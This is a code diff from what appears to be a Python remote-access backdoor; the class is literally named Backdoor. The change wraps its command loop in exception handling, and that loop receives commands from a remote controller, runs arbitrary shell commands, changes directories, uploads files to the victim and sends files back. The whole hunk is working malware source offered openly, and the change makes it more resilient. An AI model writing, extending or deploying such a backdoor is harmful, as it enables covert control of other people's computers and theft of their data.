@@ -43,25 +43,30 @@ class Backdoor:
     def run(self):
         result = ""
         while True:
-            commands = self.recv_reliably()
-            if commands[0] == "exit":
-                self.s.close()
-                exit()
-            elif commands[0] == "cd" and len(commands) > 1:
-                i, c = len(commands) - 2, 2
-                while i > 0:
-                    commands[1] = commands[1] + " " + commands[c]
-                    c += 1
-                    i -= 1
-                result = self.change_directory((commands[1]))
+            try:
+                commands = self.recv_reliably()
+                if commands[0] == "exit":
+                    self.s.close()
+                    exit()
+                elif commands[0] == "cd" and len(commands) > 1:
+                    i, c = len(commands) - 2, 2
+                    while i > 0:
+                        commands[1] = commands[1] + " " + commands[c]
+                        c += 1
+                        i -= 1
+                    result = self.change_directory((commands[1]))
+                    result = result.encode()
+                elif commands[0] == "download":
+                    result = self.send_file(commands[1])
+                elif commands[0] == "upload":
+                    result = self.write_file(commands[1], commands[2])
+                    result = result.encode()
+                else:
+                    result = self.execute(commands)
+
+            except Exception:
+                result = "[-] Error in execution of command :("
                 result = result.encode()
-            elif commands[0] == "download":
-                result = self.send_file(commands[1])
-            elif commands[0] == "upload":
-                result = self.write_file(commands[1], commands[2])
-                result = result.encode()
-            else:
-                result = self.execute(commands)
             self.send_reliably(result)  # here result is in byte format as subprocess returns in byte format
 
 
